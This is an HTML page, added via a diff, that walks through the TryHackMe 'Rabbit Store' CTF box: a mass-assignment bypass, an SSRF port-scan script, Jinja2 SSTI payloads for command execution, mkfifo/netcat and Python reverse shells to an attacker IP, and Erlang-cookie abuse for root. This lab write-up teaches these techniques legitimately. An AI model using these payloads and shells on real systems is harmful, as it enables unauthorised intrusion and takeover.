@@ -1,0 +1,783 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Rabbit Store • syndro</title>
+
+  <script>
+    (function() {
+      const saved = localStorage.getItem('theme');
+      const prefersLight = window.matchMedia('(prefers-color-scheme: light)').matches;
+      if (saved === 'light' || (!saved && prefersLight)) document.documentElement.classList.add('light');
+      else document.documentElement.classList.remove('light');
+    })();
+  </script>
+
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;900&family=Roboto+Mono:wght@300;400;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="././style.css">
+
+  <style>
+    :root { --accent:#58a6ff; --green:#3fb950; --purple:#8b5cf6; --pink:#f472b6; }
+    .light { --accent:#1f6feb; --green:#238636; }
+    body{
+      background: linear-gradient(135deg,#0f0c29,#302b63,#24243e);
+      color:#e6edf3;
+      font-family:'Roboto Mono', monospace;
+      min-height:100vh;
+      padding:40px 20px;
+      line-height:1.8;
+      transition: background .5s, color .5s;
+    }
+    .light body{ background:#f6f8fa; color:#0d1117; }
+    .container{ max-width:1100px; margin:0 auto; }
+
+    h1{
+      font-family:'Orbitron',sans-serif;
+      font-size:4.8rem;
+      text-align:center;
+      background:linear-gradient(90deg,var(--accent),var(--purple),var(--pink));
+      -webkit-background-clip:text;
+      -webkit-text-fill-color:transparent;
+      margin:18px 0 8px;
+      text-shadow:0 0 30px rgba(88,166,255,.3);
+    }
+    .meta{
+      text-align:center;
+      opacity:.92;
+      font-size:1.1rem;
+      margin-bottom:18px;
+    }
+    .meta span{ color:var(--accent); font-weight:700; }
+
+    .topbar{
+      display:flex;
+      justify-content:center;
+      gap:12px;
+      flex-wrap:wrap;
+      margin:18px 0 42px;
+    }
+    .btn{
+      border:1px solid rgba(88,166,255,.35);
+      background:rgba(88,166,255,.08);
+      color:inherit;
+      padding:10px 14px;
+      border-radius:12px;
+      cursor:pointer;
+      font-family:inherit;
+      transition: transform .18s ease, box-shadow .18s ease, background .18s ease;
+      text-decoration:none;
+      display:inline-flex;
+      align-items:center;
+      gap:8px;
+    }
+    .btn:hover{
+      transform: translateY(-1px);
+      box-shadow:0 10px 30px rgba(88,166,255,.18);
+      background:rgba(88,166,255,.14);
+    }
+
+    h2{
+      color:var(--accent);
+      margin:56px 0 16px;
+      font-family:'Orbitron',sans-serif;
+      font-size:2.2rem;
+    }
+    h3{
+      margin:30px 0 12px;
+      font-family:'Orbitron',sans-serif;
+      font-size:1.35rem;
+      opacity:.95;
+    }
+    p{ margin:14px 0; }
+
+    pre{
+      background:#161b22 !important;
+      color:#f0f6fc !important;
+      padding:18px;
+      border-radius:14px;
+      overflow-x:auto;
+      border:1px solid #30363d;
+      font-size:1.02rem;
+      margin:16px 0;
+      white-space:pre-wrap;
+    }
+    .light pre{
+      background:#f6f8fa !important;
+      color:#24292f !important;
+      border:1px solid #d0d7de !important;
+    }
+
+    code{
+      background:rgba(88,166,255,.1);
+      padding:3px 9px;
+      border-radius:8px;
+      color:var(--green);
+    }
+
+    a{
+      color:inherit;
+      text-decoration:none;
+      border-bottom:1px dashed rgba(88,166,255,.45);
+    }
+    a:hover{ color:var(--accent); }
+
+    .muted{ opacity:.9; }
+
+    ul{ margin:12px 0; padding-left:34px; }
+    li{ margin:10px 0; }
+
+    .toc{
+      border:1px solid rgba(88,166,255,.3);
+      background:rgba(88,166,255,.08);
+      padding:16px 18px;
+      border-radius:14px;
+      margin:18px 0 22px;
+    }
+    .toc a{ border-bottom:1px dashed rgba(88,166,255,.45); }
+
+    .callout{
+      border:1px solid rgba(63,185,80,.35);
+      background:rgba(63,185,80,.08);
+      padding:16px 18px;
+      border-radius:14px;
+      margin:18px 0;
+    }
+    .callout strong{ color:var(--green); }
+
+    figure{ margin:22px 0; }
+    figure img{
+      display:block;
+      max-width:100%;
+      border-radius:16px;
+      margin:0 auto;
+      box-shadow:0 20px 60px rgba(0,0,0,.6);
+      border:2px solid rgba(88,166,255,.3);
+      cursor:zoom-in !important;
+      transition: transform .35s ease, box-shadow .35s ease;
+      user-select:none;
+    }
+    figure img:hover{
+      transform:scale(1.02);
+      box-shadow:0 25px 80px rgba(88,166,255,.6);
+    }
+    figcaption{
+      text-align:center;
+      opacity:.85;
+      margin-top:10px;
+      font-size:.95rem;
+    }
+
+    /* Image Zoom Modal */
+    #imageModal{
+      position:fixed; inset:0;
+      background:rgba(0,0,0,.85);
+      display:none;
+      align-items:center;
+      justify-content:center;
+      z-index:9999;
+      padding:20px;
+    }
+    #imageModal.active{ display:flex; }
+    #imageModal img{
+      max-width:min(1100px,96vw);
+      max-height:92vh;
+      border-radius:16px;
+      border:2px solid rgba(88,166,255,.35);
+      box-shadow:0 30px 90px rgba(0,0,0,.8);
+      cursor:zoom-out;
+    }
+    .close-modal{
+      position:fixed; top:18px; right:18px;
+      font-size:34px;
+      line-height:34px;
+      width:44px; height:44px;
+      display:grid; place-items:center;
+      border-radius:12px;
+      background:rgba(255,255,255,.08);
+      border:1px solid rgba(255,255,255,.14);
+      cursor:pointer;
+      user-select:none;
+    }
+    .back {
+    position: fixed;
+    top: 30px;
+    left: 30px;
+    background: var(--accent);
+    color: #000;
+    padding: 16px 42px;
+    border-radius: 50px;
+    font-weight: bold;
+    text-decoration: none;
+    box-shadow: 0 12px 40px rgba(88,166,255,0.6);
+    transition: all 0.4s ease;
+    z-index: 9999;
+    font-size: 1.1rem;
+  }
+  .back:hover { transform: translateY(-8px) scale(1.05); box-shadow: 0 20px 60px rgba(88,166,255,0.8); }
+  .light .back { color: white; }
+
+    .footer{ margin-top:70px; opacity:.85; text-align:center; font-size:.95rem; }
+  </style>
+</head>
+
+<body>
+  <a href="../Tryhackme.html" class="back">Back</a>
+  <div class="container">
+    <h1>Rabbit Store</h1>
+    <div class="meta">TryHackMe • Linux • <span>Medium</span> • Target: <span>cloudsite.thm</span> / <span>storage.cloudsite.thm</span></div>
+
+    <div class="topbar">
+      <button id="themeToggle" class="btn" type="button">🌓 Toggle theme</button>
+      <a class="btn" href="#goals">🎯 Goals</a>
+      <a class="btn" href="#hosts">🧩 Hostnames</a>
+      <a class="btn" href="#recon">🛰️ Recon</a>
+      <a class="btn" href="#web-enum">🧪 Web enum</a>
+      <a class="btn" href="#bac">🪪 Access control</a>
+      <a class="btn" href="#api">🧭 API</a>
+      <a class="btn" href="#ssrf">🕳️ SSRF</a>
+      <a class="btn" href="#ssti">🧨 SSTI</a>
+      <a class="btn" href="#privesc">⚡ PrivEsc</a>
+    </div>
+
+    <div class="toc" id="goals">
+      <p><strong>Questions to answer</strong></p>
+      <ul>
+        <li><strong>User</strong> flag</li>
+        <li><strong>Root</strong> flag</li>
+      </ul>
+    </div>
+
+    <h2 id="hosts">0) Hostname setup</h2>
+    <p>
+      The box uses virtual hosts. Before you start browsing, map the target IP to the domains used by the app.
+    </p>
+    <pre><code>sudo vim /etc/hosts
+
+10.80.139.58 cloudsite.thm www.cloudsite.thm</code></pre>
+
+    <h2 id="recon">1) Recon</h2>
+
+    <h3>1.1 Nmap sweep (full TCP)</h3>
+    <p>
+      Start broad: scan all TCP ports and grab service/version info. Saving output helps later when you want to
+      grep for hints (like “Erlang” or “Rabbit”).
+    </p>
+    <pre><code>nmap -T4 -p- -A -r -Pn -v -sV -oN scan.nmap 10.80.139.58</code></pre>
+
+    <figure>
+      <img src="Pasted image 20260217112240.png" alt="Nmap results">
+      <figcaption>Nmap results: SSH + HTTP, plus Erlang/RabbitMQ-related ports.</figcaption>
+    </figure>
+
+    <p>
+      The normal services are there (<code>22</code> SSH, <code>80</code> HTTP), but the real “bookmark these for later”
+      items are the Erlang/RabbitMQ ports:
+    </p>
+    <ul>
+      <li><code>4369</code> — EPMD (Erlang Port Mapper Daemon)</li>
+      <li><code>25672</code> — Erlang distribution / RabbitMQ clustering (very useful once you have the cookie)</li>
+    </ul>
+
+    <div class="callout">
+      <strong>Pointer:</strong> When you see Erlang ports, assume a hidden “cookie” is the key.
+      You often won’t exploit these directly from the outside—usually you first gain a foothold, then steal <code>.erlang.cookie</code>.
+    </div>
+
+    <p>Background references:</p>
+    <ul>
+      <li><a href="https://book.hacktricks.wiki/en/network-services-pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd.html" target="_blank" rel="noreferrer">HackTricks: EPMD (4369)</a></li>
+      <li><a href="https://hackviser.com/tactics/pentesting/services/rabbitmq" target="_blank" rel="noreferrer">Hackviser: RabbitMQ ports</a></li>
+    </ul>
+
+    <h2 id="web-enum">2) Web enumeration</h2>
+
+    <h3>2.1 Content discovery (ffuf)</h3>
+    <p>
+      Quick directory fuzzing against the main vhost. Here we also try common extensions.
+    </p>
+    <pre><code>ffuf -u http://cloudsite.thm/FUZZ \
+  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
+  -fc 404 -s -e .php,.txt,.html</code></pre>
+
+    <figure>
+      <img src="Pasted image 20260217112153.png" alt="ffuf results">
+      <figcaption>ffuf finds <code>/assets</code> but it’s not immediately useful.</figcaption>
+    </figure>
+
+    <p>
+      <code>/assets</code> exists, but doesn’t lead to an obvious vulnerability. So instead of forcing a dead-end,
+      we pivot to how the app actually wants us to use it (login/register flow, subdomains, etc.).
+    </p>
+
+    <h2 id="bac">3) Broken access control → “active” subscription</h2>
+    <p>
+      The login/register link pushes us to a different host, so we add another vhost entry:
+    </p>
+
+    <pre><code>sudo vim /etc/hosts
+
+10.80.139.58 storage.cloudsite.thm www.storage.cloudsite.thm</code></pre>
+
+    <p>Register a normal user first to see the baseline behavior.</p>
+    <figure>
+      <img src="Pasted image 20260217115456.png" alt="register page">
+      <figcaption>Registration page on the storage portal domain.</figcaption>
+    </figure>
+
+    <p>After login, the app blocks us because the account is “inactive”.</p>
+    <figure>
+      <img src="Pasted image 20260217115527.png" alt="inactive message">
+      <figcaption>New users are inactive by default (subscription gate).</figcaption>
+    </figure>
+
+    <h3>3.1 Inspect the session token (JWT)</h3>
+    <p>
+      Cookies include a JWT. Decoding it reveals fields like the email and subscription state (handy for understanding the model).
+    </p>
+    <figure>
+      <img src="Pasted image 20260217115705.png" alt="jwt decode">
+      <figcaption>JWT decoded: subscription state is visible inside the token.</figcaption>
+    </figure>
+
+    <div class="callout">
+      <strong>Pointer:</strong> If the app uses JWTs, don’t immediately go “crack the secret”.
+      First question: “Can I set privileged fields earlier (registration / profile update)?”
+    </div>
+
+    <h3>3.2 Intercept registration and set subscription to active</h3>
+    <p>
+      Instead of editing a signed token, we intercept the <strong>register</strong> request and try injecting a subscription field
+      before the server stores the user.
+    </p>
+    <figure>
+      <img src="Pasted image 20260217115936.png" alt="burp intercept register">
+      <figcaption>Intercepting the register request in Burp.</figcaption>
+    </figure>
+
+    <p>Baseline request:</p>
+    <pre><code>{
+  "email": "admin2@example.com",
+  "password": "admin"
+}</code></pre>
+
+    <p>Upgraded request:</p>
+    <pre><code>{
+  "email": "admin2@example.com",
+  "password": "admin",
+  "subscription": "active"
+}</code></pre>
+
+    <div class="callout">
+      <strong>Pointer:</strong> This is a classic server-side validation failure.
+      Privileged fields must be computed server-side, not trusted from client JSON.
+    </div>
+
+    <h2 id="api">4) Portal access + first attempts</h2>
+    <p>Login with the new “active” account and the portal opens.</p>
+
+    <figure>
+      <img src="Pasted image 20260217120336.png" alt="storage dashboard">
+      <figcaption>Portal access granted once subscription is active.</figcaption>
+    </figure>
+
+    <p>Three primary features show up:</p>
+    <ul>
+      <li><strong>Upload file</strong> (classic “can I upload a webshell?” temptation)</li>
+      <li><strong>Upload from URL</strong> (often SSRF)</li>
+      <li><strong>View/list uploads</strong> (storage view)</li>
+    </ul>
+
+    <h3>4.1 Upload restrictions</h3>
+    <p>
+      Uploading an executable payload doesn’t work out of the box because the server:
+      renames files and strips extensions. That kills most “upload → execute” paths.
+    </p>
+
+    <figure>
+      <img src="Pasted image 20260217120601.png" alt="upload extension stripped">
+      <figcaption>Uploads get renamed and extensions are removed.</figcaption>
+    </figure>
+
+    <div class="callout">
+      <strong>Pointer:</strong> When upload execution is blocked, don’t tunnel-vision on bypasses.
+      Features like “fetch from URL” can be far more dangerous than uploads.
+    </div>
+
+    <h3>4.2 API hint: <code>/api/uploads/</code> → enumerate</h3>
+    <p>
+      The routing suggests an API backing the portal, so we fuzz under <code>/api</code>.
+    </p>
+
+    <figure>
+      <img src="Pasted image 20260217121056.png" alt="api fuzz">
+      <figcaption>API endpoint discovery attempt.</figcaption>
+    </figure>
+
+    <p>
+      <code>/api/docs</code> looks promising, but we’re blocked:
+    </p>
+
+    <figure>
+      <img src="Pasted image 20260217121043.png" alt="api docs denied">
+      <figcaption><code>/api/docs</code> is access denied (likely internal-only).</figcaption>
+    </figure>
+
+    <div class="callout">
+      <strong>Pointer:</strong> Internal docs are gold. If you can SSRF into them, you often skip hours of guessing endpoints/params.
+    </div>
+
+    <h2 id="ssrf">5) SSRF via “Upload from URL”</h2>
+    <p>
+      The “store URL” feature lets the server fetch a URL and store it. First test:
+      can it fetch <code>localhost</code>? If yes, SSRF is in play.
+    </p>
+
+    <p>
+      The annoying part: <code>http://localhost/</code> returns the main site, not the internal API docs we want.
+      That usually means the internal service is on a different port. So we port-hunt through SSRF.
+    </p>
+
+    <h3>5.1 Automate SSRF port discovery</h3>
+    <p>
+      The idea: repeatedly POST JSON with <code>{"url":"http://localhost:PORT/"}</code> to <code>/api/store-url</code>
+      and flag responses that don’t match the normal “denied” response.
+    </p>
+
+    <pre><code>import requests
+from concurrent.futures import ThreadPoolExecutor
+import sys
+
+TARGET = "http://storage.cloudsite.thm/api/store-url"
+JWT = "&lt;your_jwt_cookie_value_here&gt;"   # cookie name: jwt
+
+ports = range(1, 65535)
+cookies = {"jwt": JWT}
+headers = {"Content-Type": "application/json"}
+
+done = 0
+
+def scan(port: int):
+    global done
+    payload = {"url": f"http://localhost:{port}/"}
+    try:
+        r = requests.post(TARGET, headers=headers, cookies=cookies, json=payload, timeout=3)
+        done += 1
+        sys.stdout.write(f"\\r[*] {done}/{len(ports)} (port {port})")
+        sys.stdout.flush()
+
+        # Heuristic used in the notes: ignore the common denied pattern.
+        if r.status_code != 401 and len(r.text) != 41:
+            print(f"\\n[+] Interesting port {port}: status={r.status_code}, size={len(r.text)}")
+    except Exception:
+        done += 1
+
+print("[*] Starting SSRF port scan...")
+with ThreadPoolExecutor(max_workers=100) as ex:
+    ex.map(scan, ports)</code></pre>
+
+    <figure>
+      <img src="Pasted image 20260217130104.png" alt="ssrf port scan output">
+      <figcaption>SSRF port scan: <code>3000</code> is the important one for docs.</figcaption>
+    </figure>
+
+    <p>
+      Several ports respond “differently”, but <strong>3000</strong> is the one that reveals the docs.
+      With that, we can SSRF into the API documentation.
+    </p>
+
+    <h3>5.2 Read internal API docs</h3>
+    <figure>
+      <img src="Pasted image 20260217130319.png" alt="api docs page 1">
+      <figcaption>Internal API docs (page 1).</figcaption>
+    </figure>
+
+    <figure>
+      <img src="Pasted image 20260217130337.png" alt="api docs page 2">
+      <figcaption>Internal API docs (page 2) showing additional endpoints.</figcaption>
+    </figure>
+
+    <p>
+      The endpoint we care about:
+      <code>/api/fetch_messeges_from_chatbot</code> (typo included, which often hints it wasn’t well-reviewed).
+    </p>
+
+    <h3>5.3 Call it through Burp</h3>
+    <p>For quick iteration:</p>
+    <ul>
+      <li>Send a <code>POST</code></li>
+      <li><code>Content-Type: application/json</code></li>
+      <li>Body includes a <code>username</code> parameter</li>
+    </ul>
+
+    <figure>
+      <img src="Pasted image 20260217130720.png" alt="burp request">
+      <figcaption>Calling the chatbot endpoint in Burp.</figcaption>
+    </figure>
+
+    <p>It reflects our input back:</p>
+    <figure>
+      <img src="Pasted image 20260217130758.png" alt="reflected username">
+      <figcaption>Reflected input suggests server-side rendering (SSTI possibility).</figcaption>
+    </figure>
+
+    <div class="callout">
+      <strong>Pointer:</strong> Reflection isn’t automatically SSTI — but it’s enough to justify a low-noise template probe.
+    </div>
+
+    <h2 id="ssti">6) SSTI → RCE → user flag</h2>
+
+    <h3>6.1 Probe for SSTI (polyglot)</h3>
+    <figure>
+      <img src="Pasted image 20260217131028.png" alt="ssti polyglot">
+      <figcaption>Polyglot SSTI test indicates template execution is happening.</figcaption>
+    </figure>
+
+    <h3>6.2 Confirm engine with arithmetic</h3>
+    <p>A fast Jinja-style sanity check:</p>
+    <pre><code>{{7*7}}</code></pre>
+
+    <figure>
+      <img src="Pasted image 20260217131132.png" alt="7*7 works">
+      <figcaption>Arithmetic evaluates → strong confirmation of Jinja2 SSTI.</figcaption>
+    </figure>
+
+    <h3>6.3 Escalate to OS command execution</h3>
+    <p>Now we pull <code>os</code> from globals and run a harmless command first:</p>
+
+    <pre><code>{{config.__class__.__init__.__globals__['os'].popen('id').read()}}</code></pre>
+
+    <figure>
+      <img src="Pasted image 20260217131402.png" alt="id output">
+      <figcaption>RCE confirmed (command output returned).</figcaption>
+    </figure>
+
+    <div class="callout">
+      <strong>Pointer:</strong> Always prove execution with something safe (<code>id</code>/<code>whoami</code>).
+      Then switch to a reverse shell so you’re not fighting a one-line output UI.
+    </div>
+
+    <h3>6.4 Reverse shell</h3>
+    <p>Start a listener:</p>
+    <pre><code>nc -lvnp 1234</code></pre>
+
+    <p>Trigger a shell (replace <code>&lt;YOUR_IP&gt;</code> with your attacker IP):</p>
+    <pre><code>{{config.__class__.__init__.__globals__['os'].popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc &lt;YOUR_IP&gt; 1234 &gt;/tmp/f').read()}}</code></pre>
+
+    <figure>
+      <img src="Pasted image 20260217132037.png" alt="reverse shell hit">
+      <figcaption>Reverse shell triggered and caught on the listener.</figcaption>
+    </figure>
+
+    <figure>
+      <img src="Pasted image 20260217132116.png" alt="shell obtained">
+      <figcaption>Interactive shell on the target.</figcaption>
+    </figure>
+
+    <p>Grab the user flag:</p>
+    <figure>
+      <img src="Pasted image 20260217132144.png" alt="user flag">
+      <figcaption>User flag obtained.</figcaption>
+    </figure>
+
+    <div class="callout">
+      <strong>Pointer:</strong> Post-shell “must do” checklist:
+      <ul>
+        <li><code>id</code>, <code>hostname</code>, <code>pwd</code>, <code>ip a</code></li>
+        <li>Stabilize shell if needed (<code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code>)</li>
+        <li>Search configs/vars/cron/services for creds, especially anything RabbitMQ/Erlang related</li>
+      </ul>
+    </div>
+
+    <h2 id="privesc">7) PrivEsc: Erlang cookie → RabbitMQ admin → root</h2>
+
+    <h3>7.1 The “Erlang cookie” is the pivot</h3>
+    <p>
+      Those Erlang ports we saw earlier become useful once we obtain the shared cookie file.
+      If we can read <code>.erlang.cookie</code>, we can often interact with RabbitMQ internals.
+    </p>
+
+    <h3>7.2 Locate <code>.erlang.cookie</code></h3>
+    <figure>
+      <img src="Pasted image 20260217132718.png" alt="cookie location">
+      <figcaption>Cookie file discovered on disk.</figcaption>
+    </figure>
+
+    <p>Cookie value:</p>
+    <pre><code>wNkProKxfl30BVjY</code></pre>
+
+    <div class="callout">
+      <strong>Pointer:</strong> If you ever see <code>.erlang.cookie</code> readable by your current user, that’s usually game-changing.
+      Treat it like a password for RabbitMQ’s internal communication.
+    </div>
+
+    <h3>7.3 Use Erlang distribution helper (shell-erldp)</h3>
+    <p>Helper script used in the original notes:</p>
+    <p><a href="https://github.com/gteissier/erl-matter/blob/master/shell-erldp.py" target="_blank" rel="noreferrer">shell-erldp.py</a></p>
+
+    <p>Connect (adjust IP if needed):</p>
+    <pre><code>python2 shell-erldp.py 10.80.139.58 25672 wNkProKxfl30BVjY</code></pre>
+
+    <p>Upgrade to a cleaner reverse shell (example):</p>
+    <pre><code>python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("&lt;YOUR_IP&gt;",1233));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'</code></pre>
+
+    <figure>
+      <img src="Pasted image 20260217143836.png" alt="rabbit shell">
+      <figcaption>Shell obtained as the RabbitMQ service user.</figcaption>
+    </figure>
+
+    <h3>7.4 Fix cookie permissions (important)</h3>
+    <p>RabbitMQ tooling can be picky: lock down cookie perms so commands behave.</p>
+    <pre><code>chmod 600 .erlang.cookie</code></pre>
+
+    <figure>
+      <img src="Pasted image 20260217144232.png" alt="chmod cookie">
+      <figcaption>Cookie permissions adjusted.</figcaption>
+    </figure>
+
+    <h3>7.5 Create a RabbitMQ administrator user</h3>
+    <p>Once you can run <code>rabbitmqctl</code>, create an admin user:</p>
+    <pre><code>rabbitmqctl add_user &lt;username&gt; &lt;password&gt;
+rabbitmqctl set_user_tags &lt;username&gt; administrator</code></pre>
+
+    <figure>
+      <img src="Pasted image 20260217144625.png" alt="add admin user">
+      <figcaption>New RabbitMQ admin user created.</figcaption>
+    </figure>
+
+    <div class="callout">
+      <strong>Pointer:</strong> Useful follow-up enumeration:
+      <ul>
+        <li><code>rabbitmqctl list_users</code></li>
+        <li><code>rabbitmqctl list_permissions -p /</code></li>
+        <li><code>rabbitmqctl environment</code></li>
+      </ul>
+    </div>
+
+    <h3>7.6 Extract root’s stored hash</h3>
+    <figure>
+      <img src="Pasted image 20260217144904.png" alt="root hash">
+      <figcaption>Root record / hash recovered from RabbitMQ internals.</figcaption>
+    </figure>
+
+    <pre><code>{
+  "name":"root",
+  "password_hash":"49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF",
+  "hashing_algorithm":"rabbit_password_hashing_sha256",
+  "tags":["administrator"],
+  "limits":{}
+}</code></pre>
+
+    <h3>7.7 Hash format (salt + SHA-256 → base64)</h3>
+    <p>
+      RabbitMQ’s documented format implies:
+    </p>
+    <ul>
+      <li>Salt is 32 bits → <strong>4 bytes</strong></li>
+      <li>SHA-256 is 256 bits → <strong>32 bytes</strong></li>
+      <li>Stored value is Base64( salt || sha256(...) )</li>
+    </ul>
+
+    <figure>
+      <img src="Pasted image 20260217145002.png" alt="rabbitmq hashing docs">
+      <figcaption>Hashing format reference (as used in the original notes).</figcaption>
+    </figure>
+
+    <h3>7.8 Decode base64 and split salt/hash</h3>
+    <pre><code>import base64, binascii
+
+hash_b64 = "49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF"
+raw = base64.b64decode(hash_b64)
+
+salt = raw[:4]
+digest = raw[4:]
+
+print("Salt:", binascii.hexlify(salt).decode())
+print("Hash:", binascii.hexlify(digest).decode())</code></pre>
+
+    <figure>
+      <img src="Pasted image 20260217151115.png" alt="decoded salt hash">
+      <figcaption>Decoded salt + SHA-256 digest extracted.</figcaption>
+    </figure>
+
+    <h3>7.9 Switch to root</h3>
+    <pre><code>su - root
+Password: 295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585</code></pre>
+
+    <figure>
+      <img src="Pasted image 20260217151151.png" alt="root shell">
+      <figcaption>Root access achieved.</figcaption>
+    </figure>
+
+    <div class="callout">
+      <strong>Final pointers / lessons learned:</strong>
+      <ul>
+        <li><strong>Registration endpoints matter</strong>: if the server trusts client JSON fields, roles/subscriptions can be self-assigned.</li>
+        <li><strong>SSRF unlocks “internal-only”</strong>: docs + admin APIs are often reachable once you can hit localhost/ports.</li>
+        <li><strong>SSTI is a fast escalation chain</strong>: reflection → evaluation → RCE → shell.</li>
+        <li><strong>Erlang cookie is critical</strong>: once leaked, RabbitMQ internals (and sometimes system-level escalation) become reachable.</li>
+      </ul>
+    </div>
+
+    <div class="footer">
+      <a class="btn" href="#goals">⬆ Back to top</a>
+    </div>
+  </div>
+
+  <!-- Image Zoom Modal -->
+  <div id="imageModal">
+    <div class="close-modal">×</div>
+    <img id="modalImage" src="" alt="Zoomed image">
+  </div>
+
+<script type="text/javascript">
+var sc_project=13192699;
+var sc_invisible=1;
+var sc_security="f34343e1";
+var scJsHost = "https://";
+document.write("<sc"+"ript type='text/javascript' src='" +
+scJsHost+
+"statcounter.com/counter/counter.js'></"+"script>");
+</script>
+<noscript>
+  <div class="statcounter">
+    <img class="statcounter"
+         src="https://c.statcounter.com/13192699/0/f34343e1/1/"
+         alt="statcounter">
+  </div>
+</noscript>
+
+  <script>
+    // Theme toggle
+    document.getElementById('themeToggle')?.addEventListener('click', () => {
+      document.documentElement.classList.toggle('light');
+      localStorage.theme = document.documentElement.classList.contains('light') ? 'light' : 'dark';
+    });
+
+    // Image zoom modal
+    const modal = document.getElementById('imageModal');
+    const modalImg = document.getElementById('modalImage');
+    const closeModalBtn = document.querySelector('#imageModal .close-modal');
+
+    document.querySelectorAll('figure img').forEach(img => {
+      img.onclick = function(e) {
+        e.stopPropagation();
+        modalImg.src = this.getAttribute('src');
+        modal.classList.add('active');
+        document.body.style.overflow = 'hidden';
+      };
+    });
+
+    const close = () => {
+      modal.classList.remove('active');
+      document.body.style.overflow = '';
+    };
+
+    closeModalBtn.onclick = close;
+    modal.onclick = (e) => { if (e.target === modal) close(); };
+    document.addEventListener('keydown', (e) => {
+      if (e.key === 'Escape' && modal.classList.contains('active')) close();
+    });
+  </script>
+</body>
+</html>
